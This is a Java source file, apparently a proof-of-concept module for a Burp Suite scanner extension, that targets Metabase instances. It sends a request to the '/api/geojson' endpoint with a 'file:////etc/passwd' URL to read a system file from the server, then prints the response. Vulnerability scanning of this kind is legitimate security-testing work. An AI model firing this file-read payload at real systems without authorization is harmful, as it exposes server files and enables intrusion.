package burp.scan.active.poc;

import burp.*;
import burp.scan.active.ModuleBase;
import burp.scan.active.ModuleMeta;
import burp.scan.active.feature.RunOnce;
import burp.scan.lib.HTTPParser;
import burp.scan.lib.web.WebPageInfo;
import burp.scan.tags.TagTypes;
import burp.scan.tags.TagUtils;

import java.net.MalformedURLException;
import java.net.URL;
import java.io.PrintWriter;
import java.util.HashSet;
import java.util.Set;


public class MetabaseIncludeFile implements ModuleBase, RunOnce {

    @Override
    public void scan(IBurpExtenderCallbacks callbacks, WebPageInfo webInfo) {

        if (!webInfo.hasTag(TagTypes.MetaBase_Base)) {
            return ;
        }

        byte[] request = webInfo.getRequest();
        byte[] response = webInfo.getResponse();

        IRequestInfo requestInfo = callbacks.getHelpers().analyzeRequest(request);
        String url = "/api/geojson?url=file:////etc/passwd";

        String host = HTTPParser.getRequestHeaderValue(requestInfo,"host");
        if (host == null || host.length() == 0) {
            return ;
        }

        IHttpService httpService = webInfo.getHttpRequestResponse().getHttpService();
        String protocol = httpService.getProtocol();
        String queryUrl = protocol + "://" + host + url;
        PrintWriter stdout = new PrintWriter(callbacks.getStdout(),true);
        stdout.println(queryUrl);

        IExtensionHelpers helpers = callbacks.getHelpers();
        URL targetUrl = null;
        try {
            targetUrl = new URL(queryUrl);
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
        byte[] targetRequest = helpers.buildHttpRequest(targetUrl);
        byte[] targetResponse = callbacks.makeHttpRequest(httpService,targetRequest).getResponse();
        stdout.println(targetResponse);
        return ;
    }

    @Override
    public Set<String> getTags() {
        Set<String> tags = new HashSet<>();
        tags.add(TagUtils.toStandardName(TagTypes.MetaBase_Base));
        return tags;
    }

    @Override
    public ModuleMeta getMetadata() {
        return null;
    }
}
